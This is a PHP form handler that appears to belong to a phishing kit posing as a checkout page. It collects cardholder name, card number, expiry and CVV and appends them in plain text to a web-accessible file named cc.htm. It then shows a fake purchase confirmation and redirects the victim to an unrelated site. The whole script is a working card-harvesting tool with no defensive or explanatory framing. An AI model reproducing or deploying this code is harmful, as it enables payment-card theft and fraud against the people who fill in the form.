<?php
$name=$_POST['cc_name'];
$num=$_POST['cc_num'];
$mm=$_POST['cc_exp_mm'];
$yy=$_POST['cc_exp_yy'];
$cvv=$_POST['cc_cvv'];

if(strlen($num) < 11 || strlen($num) > 14) {
?>
<script type="text/javascript">
alert("Please input valid credit card number..");
window.history.back()
</script>
<?php
} else {
$file = fopen("cc.htm","a");
echo fwrite($file,"============== <br/>name : ".$name."<br/>cc num : ".$num."<br/>expired : ".$mm." | ".$yy."<br/>cvv : ".$cvv."<br/>");
fclose($file);
?>       
<script type="text/javascript">
alert("Thanks for your purchase, you'll receive a confirmation email within 24 or 48 hours..");
window.location.href = "http://www.rotaryteach.org/";
</script>
<?php } ?>        